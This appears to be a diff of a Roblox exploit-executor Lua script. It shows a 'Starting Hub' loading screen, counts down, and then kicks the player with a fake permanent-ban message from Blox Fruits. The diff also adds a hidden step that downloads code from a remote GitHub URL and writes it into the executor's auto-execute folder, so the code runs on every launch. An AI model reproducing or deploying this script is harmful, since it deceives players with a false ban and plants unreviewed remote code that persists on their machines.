@@ -1,36 +1,74 @@
+-- Script to display a message, countdown, and then kick the player with enhanced GUI effects.
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
+-- Create a ScreenGui
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = playerGui
 
+-- Create a Frame for the message
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0.5, 0, 0.3, 0)
 frame.Position = UDim2.new(0.25, 0, 0.35, 0)
-frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-frame.BorderSizePixel = 0
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 2
+frame.BorderColor3 = Color3.fromRGB(255, 255, 255)
 frame.Parent = screenGui
 
+-- Add a UI Corner for rounded edges
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0.1, 0)
+uiCorner.Parent = frame
+
+-- Create a gradient background for the frame
+local uiGradient = Instance.new("UIGradient")
+uiGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(45, 45, 45))
+}
+uiGradient.Parent = frame
+
+-- Create a TextLabel for the message
 local textLabel = Instance.new("TextLabel")
 textLabel.Size = UDim2.new(1, 0, 0.5, 0)
 textLabel.Position = UDim2.new(0, 0, 0, 0)
 textLabel.BackgroundTransparency = 1
 textLabel.Text = "Starting Hub, please wait 5 seconds"
 textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+textLabel.Font = Enum.Font.GothamBold
 textLabel.TextScaled = true
 textLabel.Parent = frame
 
+-- Create a TextLabel for the countdown
 local countdownLabel = Instance.new("TextLabel")
 countdownLabel.Size = UDim2.new(1, 0, 0.5, 0)
 countdownLabel.Position = UDim2.new(0, 0, 0.5, 0)
 countdownLabel.BackgroundTransparency = 1
-countdownLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+countdownLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
+countdownLabel.Font = Enum.Font.GothamBold
 countdownLabel.TextScaled = true
 countdownLabel.Parent = frame
 
+-- Add a glowing effect to the countdown
+local uiStroke = Instance.new("UIStroke")
+uiStroke.Color = Color3.fromRGB(255, 215, 0)
+uiStroke.Thickness = 2
+uiStroke.Parent = countdownLabel
+
+-- Countdown animation
 for i = 5, 0, -1 do
     countdownLabel.Text = tostring(i)
     wait(1) -- Wait for 1 second
 end
 
-player:Kick("You have been permanently banned from Blox Fruits for violating the rules. Reason: Exploiting detected. If you believe this is a mistake, please contact support.")
+-- Kick the player
+player:Kick("You have been permanently banned from Blox Fruits for violating the rules. Reason: Exploiting detected.")
+
+-- Save script for auto-execution in Codex folder (if running on PC)
+if writefile then
+    local scriptCode = [[
+-- Auto-Execute Script
+]] .. [[
+]] .. game:HttpGet("https://github.com/Bacon-But-Pro/Aimbot-script/raw/main/bacon/BLoxFruits")
+    writefile("Codex/AutoExecuteScript.lua", scriptCode)
+end
